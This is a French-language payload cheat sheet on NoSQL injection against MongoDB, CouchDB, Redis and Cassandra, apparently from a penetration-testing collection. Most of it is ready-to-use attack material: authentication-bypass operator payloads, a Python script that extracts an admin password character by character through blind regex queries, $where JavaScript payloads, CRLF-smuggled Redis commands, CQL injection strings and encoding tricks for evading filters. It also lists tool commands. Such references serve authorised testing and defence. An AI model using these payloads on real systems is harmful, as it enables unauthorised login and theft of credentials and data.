# 🍃 Charges utiles d’injection NoSQL

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](NoSQL-Injection.tr.md) • [🇬🇷 Ελληνικά](NoSQL-Injection.el.md)

```
███╗   ██╗ ██████╗ ███████╗ ██████╗ ██╗         ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
████╗  ██║██╔═══██╗██╔════╝██╔═══██╗██║         ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
██╔██╗ ██║██║   ██║███████╗██║   ██║██║         ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║
██║╚██╗██║██║   ██║╚════██║██║▄▄ ██║██║         ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║
██║ ╚████║╚██████╔╝███████║╚██████╔╝███████╗    ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ ╚══▀▀═╝ ╚══════╝    ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

> **Précisions de lecture :** Les opérateurs ne deviennent actifs que si l’application les transmet au moteur comme opérateurs de requête. Une chaîne reçue ou échappée comme texte ne devient pas automatiquement une requête. Les exemples propres à MongoDB, CouchDB, Redis et Cassandra ne sont pas interchangeables ; les contextes et versions doivent correspondre. Le lien de retour vise le README de Payloads, absent du dépôt source fourni ; aucun fichier de remplacement n’a été inventé.

---

## 🎯 Injection MongoDB

### Contournement de l’authentification
```javascript
// Injection JSON
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$nin": []}, "password": {"$nin": []}}

// Encodage d’URL
username[$ne]=&password[$ne]=
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true
```

### Opérateurs courants
```javascript
$eq     // Égal
$ne     // Différent
$gt     // Supérieur à
$gte    // Supérieur ou égal
$lt     // Inférieur à
$lte    // Inférieur ou égal
$in     // Présent dans le tableau
$nin    // Absent du tableau
$regex  // Expression régulière
$exists // Field exists
$or     // OU logique
$and    // ET logique
$where  // Expression JavaScript
```

---

## 💉 Charges utiles de base

### Injection dans les paramètres d’URL
```
# Contournement de l’authentification
username[$ne]=admin&password[$ne]=wrongpassword
username[$regex]=^a.*&password[$ne]=wrongpassword
username=admin&password[$ne]=wrongpassword

# Conditions toujours vraies
{"$gt": ""}
{"$ne": null}
{"$ne": ""}
{"$exists": true}
```

### Injection dans le corps JSON
```json
// Contournement de base
{"username": {"$ne": ""}, "password": {"$ne": ""}}

// Contournement par expression régulière
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

// Condition OU
{"$or": [{"username": "admin"}, {"username": {"$ne": ""}}]}

// Supérieur à
{"username": "admin", "password": {"$gt": ""}}
```

---

## 🔥 Extraction de données

### Extraction par expression régulière
```javascript
// Extraire le mot de passe caractère par caractère
password[$regex]=^a.*
password[$regex]=^b.*
password[$regex]=^c.*
...

// Extraire selon la position
password[$regex]=^.{0}a.*   // Le premier caractère est-il 'a' ?
password[$regex]=^.{1}b.*   // Le deuxième caractère est-il 'b' ?

// Caractères courants
password[$regex]=^[a-z].*   // Commence par une minuscule
password[$regex]=^[A-Z].*   // Commence par une majuscule
password[$regex]=^[0-9].*   // Commence par un chiffre
```

### Script d’extraction booléenne à l’aveugle
```python
import requests
import string

url = "http://target/login"
charset = string.ascii_letters + string.digits + "_@!#$%"
password = ""

while True:
    found = False
    for char in charset:
        payload = {
            "username": "admin",
            "password[$regex]": f"^{password}{char}.*"
        }
        r = requests.post(url, data=payload)
        if "Login successful" in r.text:
            password += char
            print(f"Found: {password}")
            found = True
            break
    if not found:
        break

print(f"Password: {password}")
```

---

## 🚀 Charges utiles avancées

### Injection JavaScript via $where
```javascript
// Fondé sur une attente (injection aveugle par temporisation)
{"$where": "sleep(5000)"}
{"username": {"$where": "sleep(5000)"}}

// Extraction de données
{"$where": "this.password.length == 8"}
{"$where": "this.password[0] == 'a'"}
{"$where": "this.password.match(/^admin/)"}

// Fondé sur les erreurs
{"$where": "this.constructor.constructor('return this.password')()"}
```

### Injection de tableaux
```json
// Opérateur $in
{"username": {"$in": ["admin", "administrator", "root"]}}

// Opérateur $nin
{"username": {"$nin": ["guest", "anonymous"]}}
```

### Injection d’opérateurs
```
# Transformer le champ en opérateur
username=admin&password[$ne]=wrongpassword

# Opérateur imbriqué
username[$eq]=admin&password[$regex]=^p

# Plusieurs opérateurs
username[$gt]=&username[$lt]=z&password[$ne]=
```

---

## 🍃 Injection CouchDB

### Charges utiles de base
```javascript
// Contournement de l’authentification
{"selector": {"username": {"$ne": ""}, "password": {"$ne": ""}}}

// Expression régulière
{"selector": {"username": {"$regex": ".*"}}}

// Supérieur à
{"selector": {"password": {"$gt": null}}}
```

### Injection dans les vues
```javascript
// Injection de requête Mango
{"selector": {"_id": {"$gt": null}}}

// Obtenir tous les documents
{"selector": {"_id": {"$regex": ".*"}}}
```

---

## 🔴 Injection Redis

### Commandes de base
```redis
# Énumération des clés
KEYS *
SCAN 0

# Extraction de données
GET key_name
HGETALL hash_name

# Définir des données
SET key value
HSET hash field value
```

### Injection de commandes via l’application
```
# Si les données utilisateur sont intégrées aux commandes Redis
username=admin\r\nKEYS *\r\n
username=admin%0d%0aKEYS *%0d%0a
```

---

## 📊 Injection Cassandra

### Injection CQL
```sql
-- Injection de base
' OR '1'='1
' OR ''='

-- Contournement avec ALLOW FILTERING
SELECT * FROM users WHERE username='admin' ALLOW FILTERING

-- Injection de commentaire
admin'--
admin'/*
```

---

## 🛡️ Techniques de contournement

### Encodage d’URL
```
$ne     →  %24ne
$gt     →  %24gt
$regex  →  %24regex
$where  →  %24where
```

### Contournement par Unicode
```
$ne     →  \u0024ne
$gt     →  \u0024gt
```

### Variantes de syntaxe des tableaux
```
# Syntaxe standard
password[$ne]=

# Variante
password[0][$ne]=
password[][$ne]=
```

### Modification du Content-Type
```
# Passer du formulaire au format JSON
Content-Type: application/json

{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

---

## 📝 Points d’injection

```
POST /login
- Body parameters (JSON/Form)
- Query string parameters

GET /users?id=
- Query parameters

En-têtes :
- Authorization
- Cookie values

API endpoints:
- GraphQL with MongoDB backend
- REST API filters
```

---

## 🔍 Liste de contrôle de la détection

```markdown
□ Tester l’opérateur $ne : {"field": {"$ne": ""}}
□ Tester l’opérateur $gt : {"field": {"$gt": ""}}
□ Tester $regex : {"field": {"$regex": ".*"}}
□ Tester $where : {"$where": "1==1"}
□ Tester la syntaxe de tableau dans une URL : field[$ne]=
□ Tester les opérateurs JSON
□ Rechercher les différences de temps de réponse
□ Rechercher les différences de longueur des réponses
□ Tester différents types de contenu
```

---

## 🔗 Outils

```bash
# NoSQLMap
git clone https://github.com/codingo/NoSQLMap.git
python nosqlmap.py

# Scanner d’injection MongoDB
nuclei -t nosql-injection.yaml -u http://target

# Tests manuels avec curl
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
```

---

## 🔗 Charges utiles connexes

- [Charges utiles SQLi](./SQLi.fr.md)
- [Injection GraphQL](./GraphQL-Injection.fr.md)

---

**Retour aux charges utiles :** [💉 Collection de charges utiles](../../README.md)
